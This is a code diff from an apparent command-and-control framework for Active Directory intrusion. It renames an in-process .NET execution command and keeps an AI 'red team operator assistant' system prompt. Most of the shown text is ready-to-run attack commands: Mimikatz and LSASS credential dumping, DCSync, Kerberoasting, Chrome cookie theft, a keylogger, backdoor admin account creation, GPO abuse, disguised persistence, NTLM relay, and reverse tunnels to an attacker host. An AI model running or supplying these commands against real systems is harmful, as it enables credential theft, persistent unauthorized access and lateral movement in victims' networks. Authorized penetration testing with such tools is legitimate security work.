@@ -587,75 +587,75 @@ func asmHint(name string) string {
 	switch {
 	// ── Credential / hash attacks ─────────────────────────────────────────
 	case strings.Contains(n, "rubeus"):
-		return "dotnet-exec Rubeus.exe kerberoast /outfile:hashes.txt  |  asktgt /user:u /password:p /domain:d /ptt  |  asreproast /format:hashcat /outfile:asrep.txt  |  dump /luid:0xdeadbeef  |  s4u /user:svc /rc4:HASH /impersonateuser:admin /msdsspn:cifs/TARGET /ptt"
+		return "DOTNET_EXEC Rubeus.exe kerberoast /outfile:hashes.txt  |  asktgt /user:u /password:p /domain:d /ptt  |  asreproast /format:hashcat /outfile:asrep.txt  |  dump /luid:0xdeadbeef  |  s4u /user:svc /rc4:HASH /impersonateuser:admin /msdsspn:cifs/TARGET /ptt"
 	case strings.Contains(n, "mimikatz"):
-		return "dotnet-exec Mimikatz.exe privilege::debug sekurlsa::logonpasswords exit  |  lsadump::sam  |  lsadump::dcsync /domain:DOMAIN /user:administrator  |  token::elevate sekurlsa::logonpasswords exit"
+		return "DOTNET_EXEC Mimikatz.exe privilege::debug sekurlsa::logonpasswords exit  |  lsadump::sam  |  lsadump::dcsync /domain:DOMAIN /user:administrator  |  token::elevate sekurlsa::logonpasswords exit"
 	case strings.Contains(n, "sharpsecdump"):
-		return "dotnet-exec SharpSecDump.exe -target=TARGET -u USER -p PASS -d DOMAIN  (remote SAM/LSA/NTDS dump — no PsExec needed)"
+		return "DOTNET_EXEC SharpSecDump.exe -target=TARGET -u USER -p PASS -d DOMAIN  (remote SAM/LSA/NTDS dump — no PsExec needed)"
 	case strings.Contains(n, "sharpdpapi"):
-		return "dotnet-exec SharpDPAPI.exe triage  |  machinetriage  |  certificates /machine  |  rdg  |  blob /target:blob.bin /unprotect  |  backupkey /server:DC /file:backup.key"
+		return "DOTNET_EXEC SharpDPAPI.exe triage  |  machinetriage  |  certificates /machine  |  rdg  |  blob /target:blob.bin /unprotect  |  backupkey /server:DC /file:backup.key"
 	case strings.Contains(n, "sharpdump"):
-		return "dotnet-exec SharpDump.exe  (MiniDumpWriteDump LSASS → C:\\Windows\\Temp\\debug.out — then download+parse)"
+		return "DOTNET_EXEC SharpDump.exe  (MiniDumpWriteDump LSASS → C:\\Windows\\Temp\\debug.out — then download+parse)"
 	case strings.Contains(n, "internalmonologue"):
-		return "dotnet-exec InternalMonologue.exe  (NetNTLMv1 hashes via SSPI without admin — crack with hashcat -m 5500)"
+		return "DOTNET_EXEC InternalMonologue.exe  (NetNTLMv1 hashes via SSPI without admin — crack with hashcat -m 5500)"
 	case strings.Contains(n, "sharproast"):
-		return "dotnet-exec SharpRoast.exe all  (Kerberoast all SPNs, output hashcat format)"
+		return "DOTNET_EXEC SharpRoast.exe all  (Kerberoast all SPNs, output hashcat format)"
 	case strings.Contains(n, "sharpchrome"):
-		return "dotnet-exec SharpChrome.exe logins  |  cookies --target chrome  |  history  (Chrome credential/cookie extraction)"
+		return "DOTNET_EXEC SharpChrome.exe logins  |  cookies --target chrome  |  history  (Chrome credential/cookie extraction)"
 	// ── Enumeration / recon ───────────────────────────────────────────────
 	case strings.Contains(n, "seatbelt"):
-		return "dotnet-exec Seatbelt.exe -group=all  |  CredEnum  LocalGroups  TokenPrivileges  UAC  DotNet  OsInfo  WindowsEventForwarding  LAPS  McAfeeSiteList  GPPPassword  PuttyHostKeys"
+		return "DOTNET_EXEC Seatbelt.exe -group=all  |  CredEnum  LocalGroups  TokenPrivileges  UAC  DotNet  OsInfo  WindowsEventForwarding  LAPS  McAfeeSiteList  GPPPassword  PuttyHostKeys"
 	case strings.Contains(n, "sharphound"):
-		return "dotnet-exec SharpHound.exe -c All -d DOMAIN --zipfilename bh.zip  |  -c DCOnly  |  -c Session,LoggedOn  |  --stealth  |  --ldapusername USER --ldappassword PASS"
+		return "DOTNET_EXEC SharpHound.exe -c All -d DOMAIN --zipfilename bh.zip  |  -c DCOnly  |  -c Session,LoggedOn  |  --stealth  |  --ldapusername USER --ldappassword PASS"
 	case strings.Contains(n, "sharpview"):
-		return "dotnet-exec SharpView.exe Get-DomainUser -Identity admin  |  Get-DomainGroupMember -Identity 'Domain Admins'  |  Get-DomainComputer -Properties name,dnshostname,operatingsystem  |  Find-LocalAdminAccess  |  Get-DomainTrust  |  Find-DomainShare -CheckShareAccess"
+		return "DOTNET_EXEC SharpView.exe Get-DomainUser -Identity admin  |  Get-DomainGroupMember -Identity 'Domain Admins'  |  Get-DomainComputer -Properties name,dnshostname,operatingsystem  |  Find-LocalAdminAccess  |  Get-DomainTrust  |  Find-DomainShare -CheckShareAccess"
 	case strings.Contains(n, "adsearch"):
-		return "dotnet-exec ADSearch.exe --search 'objectCategory=computer' --attributes cn,operatingSystem  |  --search '(adminCount=1)' --attributes sAMAccountName  |  --search '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' (DONT_EXPIRE_PASSWORD)  |  --search '(ms-MCS-AdmPwd=*)' (LAPS)"
+		return "DOTNET_EXEC ADSearch.exe --search 'objectCategory=computer' --attributes cn,operatingSystem  |  --search '(adminCount=1)' --attributes sAMAccountName  |  --search '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' (DONT_EXPIRE_PASSWORD)  |  --search '(ms-MCS-AdmPwd=*)' (LAPS)"
 	case strings.Contains(n, "adrecon"):
-		return "dotnet-exec ADRecon.exe -GenExcel  (comprehensive AD recon → Excel/CSV report in ADRecon-Report directory)"
+		return "DOTNET_EXEC ADRecon.exe -GenExcel  (comprehensive AD recon → Excel/CSV report in ADRecon-Report directory)"
 	case strings.Contains(n, "pingcastle"):
-		return "dotnet-exec PingCastle.exe --healthcheck --server DC_IP  |  --scanner aclcheck  |  --scanner antivirus  |  --scanner localadmin (AD risk score + detailed HTML report)"
+		return "DOTNET_EXEC PingCastle.exe --healthcheck --server DC_IP  |  --scanner aclcheck  |  --scanner antivirus  |  --scanner localadmin (AD risk score + detailed HTML report)"
 	case strings.Contains(n, "snaffler"):
-		return "dotnet-exec Snaffler.exe -s -o snaffler_out.log  (hunt SMB shares for creds/keys/configs/source — outputs matched files)"
+		return "DOTNET_EXEC Snaffler.exe -s -o snaffler_out.log  (hunt SMB shares for creds/keys/configs/source — outputs matched files)"
 	case strings.Contains(n, "grouper"):
-		return "dotnet-exec Grouper2.exe -p  (GPO analysis for privesc — finds write permissions, logon scripts, scheduled tasks)"
+		return "DOTNET_EXEC Grouper2.exe -p  (GPO analysis for privesc — finds write permissions, logon scripts, scheduled tasks)"
 	case strings.Contains(n, "sharpup"):
-		return "dotnet-exec SharpUp.exe audit  (local privesc checks: unquoted paths, weak ACLs, modifiable services, AlwaysInstallElevated, token privs)"
+		return "DOTNET_EXEC SharpUp.exe audit  (local privesc checks: unquoted paths, weak ACLs, modifiable services, AlwaysInstallElevated, token privs)"
 	case strings.Contains(n, "sharpmapper"):
-		return "dotnet-exec SharpMapper.exe -t 10.2.20.0/24 -p 445,3389,5985,22  (port scan from agent without spawning new process)"
+		return "DOTNET_EXEC SharpMapper.exe -t 10.2.20.0/24 -p 445,3389,5985,22  (port scan from agent without spawning new process)"
 	case strings.Contains(n, "sharprdp"):
-		return "dotnet-exec SharpRDP.exe computername=TARGET command='cmd /c net user hacker P@ss /add && net localgroup administrators hacker /add' username=DOMAIN\\user password=PASS"
+		return "DOTNET_EXEC SharpRDP.exe computername=TARGET command='cmd /c net user hacker P@ss /add && net localgroup administrators hacker /add' username=DOMAIN\\user password=PASS"
 	case strings.Contains(n, "sharpedrchecker") || strings.Contains(n, "edrchecker"):
-		return "dotnet-exec SharpEDRChecker.exe  (detect EDR/AV by process names, drivers, services, dlls loaded — use for evasion planning)"
+		return "DOTNET_EXEC SharpEDRChecker.exe  (detect EDR/AV by process names, drivers, services, dlls loaded — use for evasion planning)"
 	case strings.Contains(n, "sharplogger"):
-		return "dotnet-exec SharpLogger.exe  (SetWindowsHookEx keylogger — writes to C:\\Windows\\Temp\\log.txt)"
+		return "DOTNET_EXEC SharpLogger.exe  (SetWindowsHookEx keylogger — writes to C:\\Windows\\Temp\\log.txt)"
 	// ── AD CS attacks ─────────────────────────────────────────────────────
 	case strings.Contains(n, "certify"):
-		return "dotnet-exec Certify.exe find /vulnerable  |  request /ca:SERVER\\CA-NAME /template:TEMPLATE /altname:administrator  |  download /ca:SERVER\\CA-NAME /id:XX  THEN: certipy-ad auth -pfx admin.pfx -dc-ip DC"
+		return "DOTNET_EXEC Certify.exe find /vulnerable  |  request /ca:SERVER\\CA-NAME /template:TEMPLATE /altname:administrator  |  download /ca:SERVER\\CA-NAME /id:XX  THEN: certipy-ad auth -pfx admin.pfx -dc-ip DC"
 	case strings.Contains(n, "forgecert"):
-		return "dotnet-exec ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword pass --Subject CN=FakeUser --SubjectAltName admin@DOMAIN --NewCertPath admin.pfx --NewCertPassword admin  (forge cert from stolen CA key)"
+		return "DOTNET_EXEC ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword pass --Subject CN=FakeUser --SubjectAltName admin@DOMAIN --NewCertPath admin.pfx --NewCertPassword admin  (forge cert from stolen CA key)"
 	case strings.Contains(n, "adcspwn"):
-		return "dotnet-exec ADCSPwn.exe --adcs CA_HOST --port 80  (coerce DC auth → relay to AD CS web enrollment → DA cert)"
+		return "DOTNET_EXEC ADCSPwn.exe --adcs CA_HOST --port 80  (coerce DC auth → relay to AD CS web enrollment → DA cert)"
 	// ── AD object manipulation ────────────────────────────────────────────
 	case strings.Contains(n, "whisker"):
-		return "dotnet-exec Whisker.exe add /target:TARGET_USER /domain:DOMAIN /dc:DC  (adds msDS-KeyCredentialLink shadow cred)  THEN: dotnet-exec Rubeus.exe asktgt /user:TARGET_USER /certificate:cert.pfx /password:pass /domain:DOMAIN /ptt"
+		return "DOTNET_EXEC Whisker.exe add /target:TARGET_USER /domain:DOMAIN /dc:DC  (adds msDS-KeyCredentialLink shadow cred)  THEN: DOTNET_EXEC Rubeus.exe asktgt /user:TARGET_USER /certificate:cert.pfx /password:pass /domain:DOMAIN /ptt"
 	case strings.Contains(n, "standin"):
-		return "dotnet-exec StandIn.exe --object 'CN=TARGET,CN=Users,DC=x,DC=y' --attr msDS-KeyCredentialLink  |  --group 'Domain Admins' --ntaccount DOMAIN\\user --add  |  --computer NEWCOMP --make  |  --asrep --computer TARGET  |  --delegation  |  --removepersistence"
+		return "DOTNET_EXEC StandIn.exe --object 'CN=TARGET,CN=Users,DC=x,DC=y' --attr msDS-KeyCredentialLink  |  --group 'Domain Admins' --ntaccount DOMAIN\\user --add  |  --computer NEWCOMP --make  |  --asrep --computer TARGET  |  --delegation  |  --removepersistence"
 	case strings.Contains(n, "sharpgpoabuse"):
-		return "dotnet-exec SharpGPOAbuse.exe --AddComputerTask --TaskName 'Update' --Author 'NT AUTHORITY\\SYSTEM' --Command 'cmd.exe' --Arguments '/c net localgroup administrators DOMAIN\\user /add' --GPOName 'Default Domain Policy' --Force"
+		return "DOTNET_EXEC SharpGPOAbuse.exe --AddComputerTask --TaskName 'Update' --Author 'NT AUTHORITY\\SYSTEM' --Command 'cmd.exe' --Arguments '/c net localgroup administrators DOMAIN\\user /add' --GPOName 'Default Domain Policy' --Force"
 	// ── Persistence ───────────────────────────────────────────────────────
 	case strings.Contains(n, "sharpersist") || strings.Contains(n, "sharppersist"):
-		return "dotnet-exec SharPersist.exe -t reg -c 'C:\\Temp\\agent.exe' -k 'hkcurun' -v 'Updater' -m add  |  -t schtask -c 'C:\\Temp\\agent.exe' -n 'WindowsUpdate' -m add  |  -t startupfolder -c 'C:\\Temp\\agent.exe' -m add  |  -t service -c 'C:\\Temp\\agent.exe' -n 'WinSvc' -m add"
+		return "DOTNET_EXEC SharPersist.exe -t reg -c 'C:\\Temp\\agent.exe' -k 'hkcurun' -v 'Updater' -m add  |  -t schtask -c 'C:\\Temp\\agent.exe' -n 'WindowsUpdate' -m add  |  -t startupfolder -c 'C:\\Temp\\agent.exe' -m add  |  -t service -c 'C:\\Temp\\agent.exe' -n 'WinSvc' -m add"
 	// ── Relay / coerce ────────────────────────────────────────────────────
 	case strings.Contains(n, "krbrelay"):
-		return "dotnet-exec KrbRelay.exe -spn cifs/TARGET -clsid CLSID -rbcd ATTACKER$  |  -shadow add -shadowcreds (Kerberos relay via COM to gain RBCD or shadow creds)"
+		return "DOTNET_EXEC KrbRelay.exe -spn cifs/TARGET -clsid CLSID -rbcd ATTACKER$  |  -shadow add -shadowcreds (Kerberos relay via COM to gain RBCD or shadow creds)"
 	case strings.Contains(n, "inveigh"):
-		return "dotnet-exec Inveigh.exe -ConsoleOutput Y -NBNS Y -mDNS Y -LLMNR Y -Challenge 1122334455667788  (capture NTLMv1/v2, crack or relay)"
+		return "DOTNET_EXEC Inveigh.exe -ConsoleOutput Y -NBNS Y -mDNS Y -LLMNR Y -Challenge 1122334455667788  (capture NTLMv1/v2, crack or relay)"
 	// ── Lateral movement / execution ──────────────────────────────────────
 	case strings.Contains(n, "sharpwmi"):
-		return "dotnet-exec SharpWMI.exe action=exec computername=TARGET username=DOMAIN\\user password=PASS command='cmd /c powershell -enc BASE64'  |  action=query query='SELECT * FROM Win32_Process'"
+		return "DOTNET_EXEC SharpWMI.exe action=exec computername=TARGET username=DOMAIN\\user password=PASS command='cmd /c powershell -enc BASE64'  |  action=query query='SELECT * FROM Win32_Process'"
 	case strings.Contains(n, "sharpmove"):
-		return "dotnet-exec SharpMove.exe -action exec -target TARGET -username DOMAIN\\user -password PASS -command 'cmd /c whoami > C:\\out.txt'  |  -action scm (service creation)"
+		return "DOTNET_EXEC SharpMove.exe -action exec -target TARGET -username DOMAIN\\user -password PASS -command 'cmd /c whoami > C:\\out.txt'  |  -action scm (service creation)"
 	// ── Network tunneling ─────────────────────────────────────────────────
 	case strings.Contains(n, "chisel"):
 		return "shell chisel.exe client KALI_IP:8080 R:socks  (SOCKS5 reverse tunnel — then: proxychains nxc smb TARGET)"
@@ -663,7 +663,7 @@ func asmHint(name string) string {
 		return "shell ligolo-agent.exe -connect KALI_IP:11601 -ignore-cert  (tunnel all traffic through agent — faster than chisel)"
 	// ── Comprehensive scanners ────────────────────────────────────────────
 	case strings.Contains(n, "adpeas"):
-		return "dotnet-exec adPEAS.exe  |  adPEAS.exe -Domain DOMAIN -Server DC -Username USER -Password PASS  (all-in-one AD enum: users, groups, GPO, ACL, ADCS, trusts)"
+		return "DOTNET_EXEC adPEAS.exe  |  adPEAS.exe -Domain DOMAIN -Server DC -Username USER -Password PASS  (all-in-one AD enum: users, groups, GPO, ACL, ADCS, trusts)"
 	case strings.Contains(n, "winpeas"):
 		return "shell winPEAS.exe quiet  (local privesc — large output, use 'quiet' to reduce noise; pipe: winPEAS.exe quiet 2>&1)"
 	default:
@@ -854,19 +854,19 @@ ps / env                            process list, environment
 token whoami                        current privileges
 token steal <pid>                   steal token
 download <path>                     exfiltrate file
-dotnet-exec <assembly.exe> [args]   run .NET assembly in-process (native CLR, no sacrificial process)
+DOTNET_EXEC <assembly.exe> [args]   run .NET assembly in-process (native CLR, no sacrificial process)
   Common assemblies (check UPLOADED ASSEMBLIES section in context for what's available):
-    dotnet-exec Rubeus.exe kerberoast /outfile:hashes.txt
-    dotnet-exec Rubeus.exe asktgt /user:USER /password:PASS /domain:DOMAIN /ptt
-    dotnet-exec Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
-    dotnet-exec SharpHound.exe -c All -d DOMAIN --zipfilename bh.zip
-    dotnet-exec Seatbelt.exe -group=all
-    dotnet-exec Seatbelt.exe CredEnum LocalGroups TokenPrivileges
-    dotnet-exec Mimikatz.exe privilege::debug sekurlsa::logonpasswords exit
-    dotnet-exec Certify.exe find /vulnerable
-    dotnet-exec Certify.exe request /ca:CA /template:TMPL /altname:administrator
-    dotnet-exec SharpUp.exe audit
-    dotnet-exec SharpView.exe Get-DomainUser -Identity admin
+    DOTNET_EXEC Rubeus.exe kerberoast /outfile:hashes.txt
+    DOTNET_EXEC Rubeus.exe asktgt /user:USER /password:PASS /domain:DOMAIN /ptt
+    DOTNET_EXEC Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
+    DOTNET_EXEC SharpHound.exe -c All -d DOMAIN --zipfilename bh.zip
+    DOTNET_EXEC Seatbelt.exe -group=all
+    DOTNET_EXEC Seatbelt.exe CredEnum LocalGroups TokenPrivileges
+    DOTNET_EXEC Mimikatz.exe privilege::debug sekurlsa::logonpasswords exit
+    DOTNET_EXEC Certify.exe find /vulnerable
+    DOTNET_EXEC Certify.exe request /ca:CA /template:TMPL /altname:administrator
+    DOTNET_EXEC SharpUp.exe audit
+    DOTNET_EXEC SharpView.exe Get-DomainUser -Identity admin
 
 === LOCAL ATTACK TOOLS (Kali) ===
 scan <ip> [-p ports]
@@ -931,9 +931,9 @@ RULES:
 - certipy wrapper calls certipy-ad internally — use "certipy find ...", NOT "certipy-ad find ..."
 - gettgt syntax: gettgt <dc-ip> -d <domain> -u <user> -p <pass>  (NOT gettgt domain/user:pass)
 - finddelegation/getadusers/getadcomputers require explicit -u and -p flags (no interactive prompts)
-- dotnet-exec is the C2 in-process CLR command — NEVER call it via "shell dotnet-exec ..."
+- DOTNET_EXEC is the C2 in-process CLR command — NEVER call it via "shell DOTNET_EXEC ..."
 - All credentials from the LOOT section are available to use — always try them before brute force
-- Check UPLOADED ASSEMBLIES in context — only use dotnet-exec with assemblies that are listed there`
+- Check UPLOADED ASSEMBLIES in context — only use DOTNET_EXEC with assemblies that are listed there`
 
 const aiChatSystemPrompt = `You are an expert red team operator assistant for Active Directory pentests.
 You have access to a C2 framework. Suggest commands using <cmd></cmd> tags — the operator will confirm before execution.
@@ -994,7 +994,7 @@ LOOT — CREDENTIALS IN VAULT:
 DISCOVERED TARGETS/NETWORK:
 %s
 
-UPLOADED ASSEMBLIES (available for dotnet-exec):
+UPLOADED ASSEMBLIES (available for DOTNET_EXEC):
 %s`, target, domain, cl.aiJobsList(), agentCtx, agentNote,
 		credCtx,
 		func() string {
